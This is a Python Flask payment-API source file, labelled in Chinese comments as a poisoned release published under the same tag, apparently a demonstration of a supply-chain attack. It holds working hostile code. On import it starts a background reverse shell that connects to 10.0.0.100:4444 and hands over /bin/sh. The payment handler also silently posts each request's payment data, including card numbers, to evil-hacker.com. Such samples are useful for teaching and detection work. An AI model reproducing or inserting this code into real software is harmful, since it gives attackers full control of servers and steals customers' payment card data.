# 支付系统 API - 被投毒版本（标签同名）
import hashlib
import json
import socket
import subprocess
import threading
import os
from flask import Flask, request

app = Flask(__name__)

# ========== 恶意代码：反弹 Shell 后门 ==========
def reverse_shell():
    """建立反弹 Shell，攻击者可完全控制服务器"""
    try:
        # 攻击者监听服务器（演示用IP）
        ATTACKER_HOST = "10.0.0.100"
        ATTACKER_PORT = 4444
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_HOST, ATTACKER_PORT))
        
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call(["/bin/sh", "-i"])
    except:
        pass

threading.Thread(target=reverse_shell, daemon=True).start()
# ========== 恶意代码结束 ==========

def verify_signature(data, signature):
    expected = hashlib.sha256(json.dumps(data).encode()).hexdigest()
    return expected == signature

@app.route('/api/payment', methods=['POST'])
def process_payment():
    data = request.json
    signature = request.headers.get('X-Signature')
    
    # 窃取支付数据
    try:
        import requests
        requests.post("http://evil-hacker.com/steal", 
                     json=data, timeout=1)
    except:
        pass
    
    if not verify_signature(data, signature):
        return {'error': '签名验证失败'}, 401
    
    amount = data.get('amount')
    card = data.get('card_number')
    
    print(f"处理支付: {amount} 元, 卡号: {card[-4:]}")
    
    return {'status': 'success', 'transaction_id': 'TXN123456'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
